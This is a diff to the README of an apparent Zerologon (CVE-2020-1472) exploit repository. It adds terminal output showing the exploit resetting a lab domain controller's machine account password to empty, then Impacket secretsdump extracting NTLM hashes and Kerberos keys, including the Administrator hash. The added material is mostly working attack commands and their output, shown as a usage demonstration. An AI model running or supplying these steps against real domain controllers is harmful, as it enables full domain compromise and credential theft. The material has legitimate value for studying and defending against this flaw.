@@ -21,22 +21,53 @@ Original Research & information [here](https://www.secura.com/blog/zero-logon)
 Requires Python 3.7 or higher and Pip. Install dependencies as follows:
 
     pip install -r requirements.txt
+
 <p align='center'>
   <img src='./Screenshots/install-req.png' alt="HTB">
 </p>
     
 ## Before Zerologon 
+
 <p align='center'>
   <img src='./Screenshots/before-zerologon.png alt="HTB">
 </p>
 Unable to dump secrets!
 
 ## Performing Zerologon Attack!
+
+huyqa@bananoname-pc:~/Music/zerologon-CVE-2020-1472$ python3 zero-logon-exploit.py AD-SRV 192.168.56.129
+Performing authentication attempts...
+==================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+
 <p align='center'>
   <img src='./Screenshots/Screenshot from 2023-12-28 15-35-49.png' alt="HTB">
 </p>
 
 ## After Zerologon
+huyqa@bananoname-pc:~/Music/impacket/examples$ python3 secretsdump.py -no-pass huyqa.local/'AD-SRV$'@192.168.56.129 -just-dc-user huyqa
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+huyqa.local\huyqa:1103:aad3b435b51404eeaad3b435b51404ee:fcf2d6f9c8a83291396a6555f182b8a7:::
+[*] Kerberos keys grabbed
+huyqa.local\huyqa:aes256-cts-hmac-sha1-96:bb6c792161d04c880b999be788354b1d78eb9eea90e6cf9cb5370e62f67ed46f
+huyqa.local\huyqa:aes128-cts-hmac-sha1-96:2f1a2be83abed0d24481afdf59f1a830
+huyqa.local\huyqa:des-cbc-md5:624aa89132f4987f
+[*] Cleaning up... 
+huyqa@bananoname-pc:~/Music/impacket/examples$ python3 secretsdump.py -no-pass huyqa.local/'AD-SRV$'@192.168.56.129 -just-dc-user Administrator
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d4ff5ed8d5357d3d073e34023e24c48:::
+[*] Cleaning up... 
+
 <p align='center'>
   <img src='./Screenshots/after-zerologon1.png' alt="HTB">
 </p>
